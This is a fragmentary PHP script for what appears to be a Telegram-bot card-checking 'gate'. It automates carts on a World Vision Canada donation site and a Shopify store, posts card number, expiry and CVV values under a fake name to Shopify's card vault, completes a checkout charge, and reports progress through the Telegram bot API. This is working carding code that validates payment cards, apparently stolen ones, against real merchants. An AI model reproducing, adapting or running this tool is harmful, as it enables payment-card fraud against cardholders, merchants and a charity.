...
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "𝐆𝐚𝐭𝐞 𝐈𝐧𝐟𝐨 - <b>\n• Shopify+Moneris (v1) 10$ Charge - /sfm \n• Other Gates - /cmds </b> ",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
...
#01. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://donate.worldvision.ca/cart/add');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
...
$headers = array(
'Content-type: multipart/form-data; boundary=----WebKitFormBoundaryZUCoDMlB6bjiN8ad',
...
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryZUCoDMlB6bjiN8ad
Content-Disposition: form-data; name="properties[productType]"

regular
------WebKitFormBoundaryZUCoDMlB6bjiN8ad
Content-Disposition: form-data; name="properties[appeal_info]"

Give Where Most Needed
------WebKitFormBoundaryZUCoDMlB6bjiN8ad
Content-Disposition: form-data; name="properties[form_title]"

Give Where Most Needed
------WebKitFormBoundaryZUCoDMlB6bjiN8ad
Content-Disposition: form-data; name="properties[transaction_type]"

ODN
------WebKitFormBoundaryZUCoDMlB6bjiN8ad
Content-Disposition: form-data; name="properties[min_amount]"

10
------WebKitFormBoundaryZUCoDMlB6bjiN8ad
Content-Disposition: form-data; name="properties[mot_code]"

4454534
------WebKitFormBoundaryZUCoDMlB6bjiN8ad
Content-Disposition: form-data; name="properties[des_code]"

8011
------WebKitFormBoundaryZUCoDMlB6bjiN8ad
Content-Disposition: form-data; name="properties[product]"

Single Gift
------WebKitFormBoundaryZUCoDMlB6bjiN8ad
Content-Disposition: form-data; name="properties[amount]"

10
------WebKitFormBoundaryZUCoDMlB6bjiN8ad
Content-Disposition: form-data; name="frequencyRadioInput"
...
43544013769
------WebKitFormBoundaryZUCoDMlB6bjiN8ad
Content-Disposition: form-data; name="properties[type]"
...
curl_setopt($ch1, CURLOPT_URL, 'https://www.palmettomoononline.com/cart/40711074283568:1?traffic_source=buy_now');
...
curl_setopt($ch1, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch1, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl2 = curl_exec($ch1);
$redirect = curl_getinfo($ch1)['redirect_url'];
sleep(1);
$response_code = curl_getinfo($ch1, CURLINFO_RESPONSE_CODE);

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩 𝙇𝙞𝙣𝙠 - $response_code ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
...
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$c1.' '.$c2.' '.$c3.' '.$c4.'","name":"Jack Coddrey","month":'.$mon.',"year":'.$year.',"verification_value":"'.$cvv.'"},"payment_session_scope":"www.palmettomoononline.com"}');
$curl6 = curl_exec($ch);
...
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht3.'&step=&s='.$pid.'&checkout%5Bpayment_gateway%5D=153583621&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=1095&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=780&checkout%5Bclient_details%5D%5Bbrowser_height%5D=746&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
$curl7 = curl_exec($ch);
sleep(1);
